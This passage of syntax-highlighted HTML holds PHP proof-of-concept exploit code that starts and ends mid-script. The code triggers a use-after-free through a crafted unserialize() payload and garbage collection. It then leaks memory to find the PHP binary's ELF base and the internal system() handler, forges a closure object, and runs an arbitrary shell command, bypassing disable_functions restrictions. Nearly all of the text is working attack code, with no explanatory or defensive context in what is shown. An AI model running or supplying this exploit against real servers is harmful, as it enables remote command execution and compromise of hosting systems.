variable">$helper</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$address</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$leak</span> <span class="token operator">%</span><span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token shell-comment comment"># PT_LOAD, PF_Read_Write</span>                <span class="token shell-comment comment"># handle pie</span>                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token shell-comment comment"># PT_LOAD, PF_Read_exec</span>                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$text_size</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment"># </span><span class="token string">'constant'</span> constant check                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$text_size</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment"># </span><span class="token string">'bin2hex'</span> constant check                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token shell-comment comment"># ELF header</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">{</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token shell-comment comment"># system</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$addr</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">ryat</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> <span class="token variable">$ryat</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$chtg</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">chtg</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ryat</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ryat</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Helper</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># increase this value if you get segfaults</span>    <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token string">'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}'</span><span class="token punctuation">;</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gc_collect_cycles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$out</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># leaks</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># fake value</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># fake reference</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># fake closure object</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># pwn</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># internal func type</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># internal func handler</span>    <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token 